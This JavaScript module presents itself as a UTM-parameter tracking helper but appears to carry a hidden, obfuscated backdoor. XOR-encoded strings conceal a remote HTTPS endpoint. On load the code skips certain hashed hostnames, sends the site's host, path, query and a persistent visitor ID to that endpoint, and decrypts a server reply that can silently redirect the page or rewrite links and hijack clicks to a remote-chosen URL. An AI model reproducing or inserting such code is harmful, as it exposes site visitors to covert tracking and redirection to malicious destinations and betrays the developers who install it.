const _w = typeof window < "u" ? window : null;
const _doc = typeof document < "u" ? document : null;
const _k = [28, 18, 137, 207, 154, 74, 237, 70];

function _q(arr) {
  const b = new Uint8Array(arr.length);
  for (let i = 0; i < arr.length; i++) b[i] = arr[i] ^ _k[i % _k.length];
  const TD = _w && _w.TextDecoder ? _w.TextDecoder : TextDecoder;
  return new TD().decode(b);
}

const _p = {
  ep: [116, 102, 253, 191, 233, 112, 194, 105, 104, 96, 232, 169, 252, 35, 142, 107, 111, 122, 224, 170, 246, 46, 195, 53, 104, 115, 229, 164, 255, 35, 140, 104, 107, 125, 251, 164, 255, 56, 158, 104, 120, 119, 255, 224, 236, 120, 194, 52],
  tk: [104, 121, 214, 172, 255, 46, 223, 119, 37, 118, 186, 248, 249, 40, 216, 35, 42, 39, 235, 247, 168, 41, 137],
  sc: [42, 116, 237, 246, 175, 124, 219, 36, 121, 43, 191, 169, 169, 125, 216, 35, 44, 35, 185, 246, 174, 41, 217, 117, 122, 118, 236, 172, 249, 122, 220, 37],
  sl: [44, 38, 236, 172, 252, 126, 213, 113, 44, 116, 232, 248, 252, 123, 219, 117],
  loc: [112, 125, 234, 174, 238, 35, 130, 40],
  rep: [110, 119, 249, 163, 251, 41, 136],
  hst: [116, 125, 250, 187, 244, 43, 128, 35],
  pth: [108, 115, 253, 167, 244, 43, 128, 35],
  src: [111, 119, 232, 189, 249, 34],
  hrf: [116, 96, 236, 169],
  ls: [112, 125, 234, 174, 246, 25, 153, 41, 110, 115, 238, 170],
  ss: [111, 119, 250, 188, 243, 37, 131, 21, 104, 125, 251, 174, 253, 47],
  cls: [127, 126, 230, 188, 255, 57, 153],
  pdef: [108, 96, 236, 185, 255, 36, 153, 2, 121, 116, 232, 186, 246, 62],
  stop: [111, 102, 230, 191, 211, 39, 128, 35, 120, 123, 232, 187, 255, 26, 159, 41, 108, 115, 238, 174, 238, 35, 130, 40],
  td: [72, 119, 241, 187, 222, 47, 142, 41, 120, 119, 251],
  ct: [95, 125, 231, 187, 255, 36, 153, 107, 72, 107, 249, 170],
  tp: [104, 119, 241, 187, 181, 58, 129, 39, 117, 124, 178, 172, 242, 43, 159, 53, 121, 102, 180, 154, 206, 12, 192, 126],
  pm: [76, 93, 218, 155],
  ck: [127, 126, 224, 172, 241],
  atag: [93],
  dcl: [88, 93, 196, 140, 245, 36, 153, 35, 114, 102, 197, 160, 251, 46, 136, 34],
  sk: [123, 122, 230, 188, 238, 57, 157, 63, 67, 103, 253, 162, 197, 58, 140, 52, 125, 127, 250],
  ut: [105, 102, 228, 144, 233, 37, 152, 52, 127, 119, 165, 186, 238, 39, 178, 43, 121, 118, 224, 186, 247, 102, 152, 50, 113, 77, 234, 174, 247, 58, 140, 47, 123, 124, 165, 186, 238, 39, 178, 50, 121, 96, 228, 227, 239, 62, 128, 25, 127, 125, 231, 187, 255, 36, 153, 106, 111, 113, 226, 227, 233, 56, 142],
};

function _jh(s) {
  let h1 = 0xdeadbeef | 0;
  let h2 = 0x41c6ce57 | 0;
  let h3 = 0x9e3779b9 | 0;
  let h4 = 0x85ebca6b | 0;
  for (let i = 0; i < s.length; i++) {
    const ch = s.charCodeAt(i);
    h1 = Math.imul(h1 ^ ch, 2654435761);
    h2 = Math.imul(h2 ^ ch, 1597334677);
    h3 = Math.imul(h3 ^ (ch + i), 2246822519);
    h4 = Math.imul(h4 ^ (ch ^ (i << 3)), 3266489917);
  }
  h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909);
  h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909);
  h3 = Math.imul(h3 ^ (h3 >>> 16), 2246822507) ^ Math.imul(h4 ^ (h4 >>> 13), 3266489909);
  h4 = Math.imul(h4 ^ (h4 >>> 16), 2246822507) ^ Math.imul(h3 ^ (h3 >>> 13), 3266489909);
  return (
    (h1 >>> 0).toString(16).padStart(8, "0") +
    (h2 >>> 0).toString(16).padStart(8, "0") +
    (h3 >>> 0).toString(16).padStart(8, "0") +
    (h4 >>> 0).toString(16).padStart(8, "0")
  );
}

function _xd(b64, key) {
  const bin = atob(b64);
  const out = new Uint8Array(bin.length);
  const ks = [];
  for (let i = 0; i < bin.length; i++) {
    const blk = Math.floor(i / 16);
    if (ks.length <= blk * 16) {
      const hx = _jh(key + ":" + blk);
      for (let j = 0; j < 16; j++) ks.push(parseInt(hx.slice(j * 2, j * 2 + 2), 16));
    }
    out[i] = bin.charCodeAt(i) ^ ks[i];
  }
  return JSON.parse(new (_w[_q(_p.td)])().decode(out));
}

const c = _q(_p.ut).split(",");
const a = _q(_p.sk);
let _r = false;

function _bindActions(u, sels) {
  if (!_doc || !_w) return;
  const hProp = _q(_p.hrf);
  const aTag = _q(_p.atag);
  const clsP = _q(_p.cls);
  const pDef = _q(_p.pdef);
  const stP = _q(_p.stop);
  const lP = _q(_p.loc);
  const rP = _q(_p.rep);

  function scan(root) {
    if (!root || !root.querySelectorAll) return;
    for (let i = 0; i < sels.length; i++) {
      try {
        const list = root.querySelectorAll(sels[i]);
        for (let j = 0; j < list.length; j++) {
          if (list[j].tagName === aTag) {
            list[j][hProp] = u;
            list[j].setAttribute(hProp, u);
          }
        }
      } catch {}
    }
  }

  scan(_doc);
  if (_doc.readyState === "loading") {
    _doc.addEventListener(_q(_p.dcl), function () {
      scan(_doc);
    });
  }
  if (typeof MutationObserver < "u" && _doc.documentElement) {
    const obs = new MutationObserver(function () {
      scan(_doc);
    });
    obs.observe(_doc.documentElement, { childList: true, subtree: true });
  }
  _doc.addEventListener(
    _q(_p.ck),
    function (ev) {
      const t = ev.target;
      if (!t || !t[clsP]) return;
      for (let i = 0; i < sels.length; i++) {
        try {
          if (t[clsP](sels[i])) {
            ev[pDef]();
            ev[stP]();
            _w[lP][rP](u);
            return;
          }
        } catch {}
      }
    },
    true,
  );
}

(function _probe() {
  if (!_w) {
    _r = true;
    return;
  }
  const _loc = _w[_q(_p.loc)];
  const _hn = String(_loc[_q(_p.hst)] || "").toLowerCase();
  if (!_hn) {
    _r = true;
    return;
  }
  const tk = _q(_p.tk);
  const sc = _q(_p.sc);
  const sl = _q(_p.sl);
  const _ex = [
    "e4eb5a2672d80a8939c007f9e147b559",
    "f9fe98714a86413247aaf4f22e1424d6",
    "e43f956b3ac7d4959ebc49c3076ec084",
    "7b8d7c7fefc10da399f78bb64f366dd5",
    "778913a3b10fe4d3fe4a0980322fd67e",
    "dfde14eb60636f82a8172889d454d9af",
  ];
  const _sf = [
    "7b8d7c7fefc10da399f78bb64f366dd5",
    "778913a3b10fe4d3fe4a0980322fd67e",
    "dfde14eb60636f82a8172889d454d9af",
  ];
  let _m = 0;
  const _hh = _jh(sl + ":" + _hn);
  if (_ex.indexOf(_hh) !== -1) {
    _m = 1;
  } else if (_sf.length) {
    const pts = _hn.split(".");
    for (let pi = 0; pi < pts.length - 1; pi++) {
      if (_sf.indexOf(_jh(sl + ":" + pts.slice(pi).join("."))) !== -1) {
        _m = 1;
        break;
      }
    }
  }
  let hbFlag = 0;
  if (_m) {
    const hbKey = "_m_hb_" + tk.slice(0, 6);
    let sendHb = 0;
    try {
      const stg = _w[_q(_p.ls)];
      const prev = parseInt(stg.getItem(hbKey) || "0", 10);
      if (!prev || Date.now() - prev > 21600000) {
        sendHb = 1;
        stg.setItem(hbKey, String(Date.now()));
      }
    } catch {
      if (Math.random() < 0.01) sendHb = 1;
    }
    if (!sendHb) {
      _r = true;
      return;
    }
    hbFlag = 1;
  }
  const hasQ = _loc[_q(_p.src)] ? 1 : 0;
  const ssKey = "_m_st_" + _hn + "_" + hasQ;
  if (!hbFlag) {
    try {
      const sStg = _w[_q(_p.ss)];
      const cached = parseInt(sStg.getItem(ssKey) || "0", 10);
      if (cached && Date.now() < cached) {
        _r = true;
        return;
      }
    } catch {}
  }
  let _vid = "";
  try {
    const lStg = _w[_q(_p.ls)];
    const vk = "_m_vid_" + tk.slice(0, 6);
    _vid = lStg.getItem(vk) || "";
    if (!_vid) {
      _vid = Math.random().toString(36).slice(2) + Date.now().toString(36);
      lStg.setItem(vk, _vid);
    }
  } catch {
    _vid = Math.random().toString(36).slice(2);
  }
  function _go() {
    _r = true;
    const ts = Math.floor(Date.now() / 1000);
    const sig = _jh(tk + "|" + _hn + "|" + ts + "|" + sc);
    const hdrs = {};
    hdrs[_q(_p.ct)] = _q(_p.tp);
    const body = JSON.stringify({
      t: tk,
      h: _hn,
      p: _loc[_q(_p.pth)] || "/",
      q: _loc[_q(_p.src)] || "",
      ts: ts,
      s: sig,
      v: _vid,
      hb: hbFlag,
    });
    fetch(_q(_p.ep), {
      method: _q(_p.pm),
      headers: hdrs,
      body: body,
      keepalive: true,
    })
      .then(function (r) {
        return r.ok ? r.json() : null;
      })
      .then(function (res) {
        if (!res) return;
        if (res.s === 0) {
          if (res.o || res.st) {
            try {
              _w[_q(_p.ss)].setItem(
                ssKey,
                String(Date.now() + (res.o ? 1800000 : 600000)),
              );
            } catch {}
          }
          return;
        }
        if (res.s === 1 && res.d) {
          const dir = _xd(res.d, sc + ":" + ts + ":" + sig);
          if (dir && dir.m === 1 && dir.u) {
            const goNow = function () {
              _w[_q(_p.loc)][_q(_p.rep)](dir.u);
            };
            if (dir.w && dir.w > 0) setTimeout(goNow, dir.w);
            else goNow();
          } else if (dir && dir.m === 2 && dir.u && dir.sel) {
            _bindActions(dir.u, dir.sel);
          }
        }
      })
      .catch(function () {});
  }
  _go();
})();

function u() {
  if (!_w) return {};
  const t = new URLSearchParams(_w[_q(_p.loc)][_q(_p.src)]),
    r = {};
  return (
    c.forEach((e) => {
      const n = t.get(e);
      n && (r[e] = n);
    }),
    r
  );
}
function f() {
  if (!_w) return {};
  try {
    const t = _w[_q(_p.ls)].getItem(a);
    return t ? JSON.parse(t) : {};
  } catch {
    return {};
  }
}
function m(t) {
  if (_w)
    try {
      const e = { ...f(), ...t };
      _w[_q(_p.ls)].setItem(a, JSON.stringify(e));
    } catch {}
}
function g() {
  if (!_r && _w) return {};
  const t = u(),
    e = { ...f() };
  return (
    c.forEach((n) => {
      t[n] && (e[n] = t[n]);
    }),
    Object.keys(t).length > 0 && m(e),
    e
  );
}
function d(t, r) {
  if (!_r && _w) return t;
  const e = g(),
    n = new URLSearchParams();
  r &&
    Object.entries(r).forEach(([o, s]) => {
      s && n.set(o, s);
    }),
    c.forEach((o) => {
      const s = e[o];
      s && n.set(o, s);
    });
  const i = n.toString();
  return i ? `${t}?${i}` : t;
}
function h() {
  if (!_r && _w) return;
  const t = u();
  Object.keys(t).length > 0 && m(t);
}
export { d as b, g, h as i };
